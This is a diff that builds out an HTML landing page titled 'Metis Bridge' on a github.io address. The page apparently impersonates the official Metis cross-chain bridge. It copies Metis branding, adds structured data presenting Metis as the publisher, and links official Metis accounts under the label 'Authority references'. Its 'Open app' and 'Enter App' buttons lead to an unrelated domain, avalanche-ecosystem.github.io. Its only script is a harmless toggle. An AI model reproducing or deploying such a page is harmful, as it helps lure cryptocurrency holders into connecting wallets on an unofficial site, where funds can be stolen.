@@ -1,1 +1,130 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Metis Bridge</title><meta name="description" content="Metis Bridge moves ETH and tokens to Metis through a fast, low-fee cross-chain route."><link rel="canonical" href="INSERT_URL/"><meta name="theme-color" content="#ffffff"><link rel="icon" type="image/svg+xml" href="favicon.svg"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="web-app-manifest-192x192.png"><link rel="stylesheet" href="style.css"></head><body><div id="root"><h1>Metis Bridge</h1><h2>Metis bridge</h2><p><strong>Metis Bridge</strong> moves ETH and tokens to Metis through a fast, low-fee cross-chain route.</p></div><script src="app.js" defer></script></body></html>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Metis Bridge</title>
+  <meta name="description" content="Metis Bridge moves ETH and tokens between Ethereum and Metis from your own wallet.">
+  <link rel="canonical" href="https://metis-bridge.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#05080C">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Metis Bridge">
+  <meta property="og:description" content="Metis Bridge moves ETH and tokens between Ethereum and Metis from your own wallet.">
+  <meta property="og:url" content="https://metis-bridge.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Metis Bridge">
+  <meta name="twitter:description" content="Metis Bridge moves ETH and tokens between Ethereum and Metis from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://metis-bridge.github.io/#website",
+        "url": "https://metis-bridge.github.io/",
+        "name": "Metis Bridge",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://metis-bridge.github.io/#organization",
+        "name": "Metis",
+        "url": "https://www.metis.io/",
+        "sameAs": [
+          "https://twitter.com/MetisL2",
+          "https://github.com/MetisProtocol",
+          "https://metisl2.medium.com/",
+          "https://www.youtube.com/@Metis_L2"
+        ]
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://metis-bridge.github.io/#app",
+        "name": "Metis Bridge",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://metis-bridge.github.io/",
+        "description": "Metis Bridge moves ETH and tokens between Ethereum and Metis from your own wallet.",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        },
+        "publisher": {
+          "@id": "https://metis-bridge.github.io/#organization"
+        }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#" aria-label="Metis Bridge home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Metis</span>
+    </a>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://explorer.metis.io/" target="_blank" rel="nofollow noopener noreferrer">Metis explorer</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridge explainer</a>
+      <a href="https://www.metis.io/" target="_blank" rel="nofollow noopener noreferrer">Metis official</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Metis Bridge</h1>
+      <p class="sub"><strong>Metis Bridge</strong> moves ETH and tokens between Ethereum and Metis from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Bridge preview">
+      <div class="card-head">Bridge</div>
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="token" src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="token" src="metis.png" width="28" height="28" alt="METIS">
+            <span>METIS</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+      <p class="note">Preview only</p>
+    </section>
+  </main>
+
+  <footer class="foot"><b>Metis Bridge</b> &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
